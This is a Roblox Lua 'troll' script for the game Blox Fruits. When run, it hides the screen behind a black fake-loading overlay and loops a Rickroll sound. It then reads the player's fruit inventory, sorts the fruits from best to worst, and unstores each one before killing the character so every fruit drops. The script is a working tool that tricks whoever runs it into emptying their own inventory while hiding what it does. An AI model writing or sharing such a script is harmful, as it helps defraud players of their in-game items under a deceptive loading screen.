-- Troll ULTIMATE: Black Screen + Rickroll + Unstore ALL Fruits (Best -> Worst) + Reset LOOP (Blox Fruits Tiger Update 2026)
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local SoundService = game:GetService("SoundService")
local Player = Players.LocalPlayer

local Remotes = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")

-- FULL Priority Fruits 2026 (Tiger = ex-Leopard TOP1, S->D tier from Pocket Tactics + Wiki)
local priorityFruits = {
    -- S Tier (Best)
    "Tiger", "Dragon", "Venom", "Dough", "Shadow", "Soul", "Dark", "Blizzard", "Kitsune", "Gas",
    -- A Tier
    "Phoenix", "Rumble", "Control", "Light", "Magma", "Flame", "Quake", "String", "Creation", "Ice", "Yeti", "Spider", "Eagle",
    -- B Tier
    "Sand", "Paw", "Door", "Gravity", "Revive", "Diamond", "T-Rex", "Buddha", "Mammoth",
    -- C Tier
    "Love", "Rubber", "Spring", "Smoke", "Blade",
    -- D Tier (Worst)
    "Spin", "Spike", "Kilo", "Bomb", "Chop"
}

-- Black loading screen FULL COVER
local sg = Instance.new("ScreenGui")
sg.Name = "TrollBlackScreenALL"
sg.IgnoreGuiInset = true
sg.ResetOnSpawn = false
sg.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 0
frame.Parent = sg

local title = Instance.new("TextLabel")
title.Size = UDim2.new(0.9, 0, 0.12, 0)
title.Position = UDim2.new(0.05, 0, 0.1, 0)
title.BackgroundTransparency = 1
title.Text = "Loading ULTIMATE Troll Script... (ALL Fruits Edition)"
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.Parent = frame

local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(0.6, 0, 0.04, 0)
progressBg.Position = UDim2.new(0.2, 0, 0.55, 0)
progressBg.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
progressBg.BorderSizePixel = 0
progressBg.Parent = frame

local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = Color3.new(1, 0.2, 0.2)  -- Red for troll
progressFill.BorderSizePixel = 0
progressFill.Parent = progressBg

local countLabel = Instance.new("TextLabel")
countLabel.Size = UDim2.new(0.9, 0, 0.08, 0)
countLabel.Position = UDim2.new(0.05, 0, 0.65, 0)
countLabel.BackgroundTransparency = 1
countLabel.Text = "Scanning inventory..."
countLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
countLabel.TextScaled = true
countLabel.Font = Enum.Font.Gotham
countLabel.Parent = frame

-- Animate initial progress
TweenService:Create(progressFill, TweenInfo.new(3, Enum.EasingStyle.Quad), {Size = UDim2.new(0.3, 0, 1, 0)}):Play()

-- Rickroll sound (LOUDER)
local rickSound = Instance.new("Sound")
rickSound.SoundId = "rbxassetid://1848354536"  -- Never Gonna Give You Up
rickSound.Volume = 0.8
rickSound.Looped = true
rickSound.Parent = SoundService
rickSound:Play()

-- MAIN TROLL: Get ALL fruits, sort best->worst, unstore + drop ONE BY ONE
spawn(function()
    wait(2)
    
    title.Text = "Found ALL Fruits! Dropping Best First... 😈"
    
    -- Get inventory
    local success, inv = pcall(function() return Remotes:InvokeServer("GetUserInventory") end)
    if not success then 
        title.Text = "ERROR: Rejoin server!"; 
        rickSound:Stop(); 
        wait(3); 
        sg:Destroy(); 
        return 
    end
    
    local fruits = inv and inv.Fruits or {}
    local availableFruits = {}
    
    -- Collect ALL fruits with count >0
    for fruitName, count in pairs(fruits) do
        if count and count > 0 and typeof(fruitName) == "string" then
            table.insert(availableFruits, fruitName)
        end
    end
    
    -- Sort by priority (best first: lower index in priorityFruits = better)
    table.sort(availableFruits, function(a, b)
        local indexA = 999
        local indexB = 999
        for i, pri in ipairs(priorityFruits) do
            if pri == a then indexA = i end
            if pri == b then indexB = i end
        end
        return indexA < indexB
    end)
    
    local total = #availableFruits
    if total == 0 then
        title.Text = "No fruits in inventory! Trolled anyway 😂"
        rickSound:Stop()
        wait(3)
        sg:Destroy()
        return
    end
    
    countLabel.Text = "Total: " .. total .. " fruits to DROP!"
    
    -- Progress full animate
    TweenService:Create(progressFill, TweenInfo.new(2, Enum.EasingStyle.Quad), {Size = UDim2.new(0.6, 0, 1, 0)}):Play()
    wait(2)
    
    -- LOOP DROP ALL
    for i, bestFruit in ipairs(availableFruits) do
        title.Text = "Dropping #" .. i .. ": " .. bestFruit .. " (BEST FIRST)"
        countLabel.Text = i .. "/" .. total .. " - Unstoring..."
        
        -- Unstore (equip)
        pcall(function() 
            Remotes:InvokeServer("StoreFruit", bestFruit, "2") 
        end)
        
        wait(2.5)  -- Wait equip
        
        countLabel.Text = i .. "/" .. total .. " - RESETTING (DROPPED!)"
        -- Reset to DROP fruit
        if Player.Character and Player.Character:FindFirstChild("Humanoid") then
            Player.Character.Humanoid.Health = 0
        end
        
        -- Progress update
        TweenService:Create(progressFill, TweenInfo.new(1.5, Enum.EasingStyle.Quad), {Size = UDim2.new((i/total), 0, 1, 0)}):Play()
        
        wait(4)  -- Wait full respawn + safe
    end
    
    title.Text = "ALL FRUITS DROPPED! TOTAL TROLL 😈😂"
    countLabel.Text = "GG WP - Inventory EMPTY!"
    rickSound:Stop()
    
    wait(4)
    sg:Destroy()
end)

print("ULTIMATE ALL-FRUITS TROLL ACTIVATED! Tiger & ALL dropped soon... 🔥")
